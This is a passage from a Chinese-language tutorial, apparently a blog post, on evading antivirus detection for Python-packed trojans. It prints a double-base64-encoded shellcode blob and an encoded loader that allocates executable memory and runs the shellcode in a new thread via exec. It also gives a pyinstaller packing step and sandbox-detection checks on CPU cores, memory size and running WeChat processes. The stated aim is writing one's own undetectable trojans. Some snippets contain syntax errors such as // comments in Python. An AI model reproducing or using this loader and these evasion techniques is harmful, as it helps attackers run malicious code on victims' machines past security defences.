EhoalpseDRNVGxjZURZMFhIZzBPRng0TkdWY2VEWmtYSGhoT0Z4NFlqZGNlR0UwWEhnM05seDROVFJjZURRNVhIaGpPVng0TkRKY2VHTTNYSGd3WWx4NE9ESmNlR0ZrWEhnd1pWeDRNakJjZURZNVhIaGtOMXg0T1RoY2VHSTBYSGhpWWx4NFpESmNlRFV6WEhnelkxeDROelZjZURRd1hIaGtNMXg0TTJGY2VETmlYSGczT0Z4NFlXRmNlR014WEhneU5GeDROVFJjZURaalhIaGxOVng0TVdSY2VEQmxYSGhsTkZ4NFpUbGNlREU0WEhnMk1WeDRNVFpjZURFMlhIZzNNRng0WW1aY2VETTBYSGcxTlZ4NFpqSmNlRGd5WEhneVkxeDRNak5jZUdFMlhIZzBNbHg0TURGY2VEbGpYSGd5WVZ4NFlqTmNlR1ppWEhnek1seDRZakJjZURBd1hIZzFOVng0WlROY2VHUmpYSGc0TjF4NE5UUmNlR0ZrWEhobFpWeDRNMk5jZURsa1hIZzNOMXg0WkRsY2VEUmtYSGhtTWx4NE5UaGNlRFV3WEhoaVpseDRaREJjZURZNVhIZ3lZVng0TkdWY2VEVTFYSGhtWlZ4NE5HTmNlRGcwWEhoaU9WeDRPRFJjZUdZelhIaGpZMXg0WTJWY2VEbGpYSGhoWkZ4NE0yVmNlREJpWEhnME1WeDRNRGxjZURBeFhIZzNOMXg0TlROY2VHRTJYSGhrTUZ4NFpEVmNlR1JtWEhnMlpseDROamhjZURJM1hIZzRObHg0TldSY2VEZGpYSGcyWVZ4NE1tRmNlRFUxWEhnNE9WeDRPRFJjZUdFMFhIZ3dNVng0WVRKY2VEQTFYSGhtTlZ4NFltVmNlR1F4WEhnd05WeDRNR05jZUdJelhIZzVPRng0WTJSY2VEQTFYSGd6TTF4NFlqbGNlRFU0WEhnelpWeDRNbVZjZURBd1hIaGlabHg0WTJKY2VHTmtYSGd4Tmx4NE56aGNlR1EwWEhoaE5seDRZamRjZUdFd1hIZ3pabHg0TTJGY2VHRmtYSGc1TWx4NE5tWmNlRGxrWEhneVpGeDROVE5jZUdOaVhIZzFNRng0TmpCY2VERXhYSGhsWkZ4NE9ESmNlRFU1WEhneE9WeDRZVFpjZUdZdw=='
	//对shellcode进行了两次的base64加密

	shellcode = base64.b64decode(base64.b64decode(shellcode))
	//进行两次shellcode解密

	shellcode = shellcode.decode('utf-8')
	loader = "Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MucmVzdHlwZT1jdHlwZXMuY191aW50NjQ7cnd4cGFnZSA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jKDAsIGxlbihzaGVsbGNvZGUpLCAweDEwMDAsIDB4NDApO2N0eXBlcy53aW5kbGwua2VybmVsMzIuUnRsTW92ZU1lbW9yeShjdHlwZXMuY191aW50NjQocnd4cGFnZSksIGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcihzaGVsbGNvZGUpLCBsZW4oc2hlbGxjb2RlKSk7aGFuZGxlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoMCwgMCwgY3R5cGVzLmNfdWludDY0KHJ3eHBhZ2UpLCAwLCAwLCAwKTtjdHlwZXMud2luZGxsLmtlcm5lbDMyLldhaXRGb3JTaW5nbGVPYmplY3QoaGFuZGxlLCAtMSk="
	//对加载内存里并运行shellcode的代码进行了一次base64加密

	exec (base64.b64decode(loader))
	//使用exec函数执行loader变量里的代码

else:
//核心数小于4就退出
	print("no sandbox")
```
打包
```
pyinstaller -F test.py
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/36f05cfc28dd40feacce441c229cf4a0.png)

但是shellcode特征太明显了，因为是用msf生成的，所以还是老样子，之后自己写的话就会好很多

### 通过物理内存判断是否是沙箱
```
import psutil

all_memory = psutil.virtual_memory().total
//获取内存总大小

use_memory = psutil.virtual_memory().used
//获取使用的内存大小
```
### 通过判断一些程序来反沙箱
有些沙箱里是不会安装日常使用的软件，我们可以通过这个点来反沙箱，这里以微信程序为例
```
list = popen("cmd /c tasklist").read()
//运行tasklist命令，并获取输出的内容

for i in list.split('\n'):
//遍历获取的内容

	if "WeChat.exe" in i:
		sandbox = 1

if(sandbox  == 1):
	//需要执行的代码

else：
	print("no sandbox")
```
### 总结
绕过沙箱的方法还有很多，但是查系统状态也是敏感行为，不过不用担心
# 总结
其实还可以使用第三方工具进行免杀，但是这种方法太过脚本小子，工具的特征过不了多久就会被杀软发现，最好还是掌握自己写代码免杀的技巧

可以尝试不同的软件对python程序打包exe

msf和cs生成的shellcode代码特征太明显了，自己写木马的话，免杀就会轻松很多，这里只是一些静态过木马的知识，之后会继续写动态过免杀以及制作木马的文章
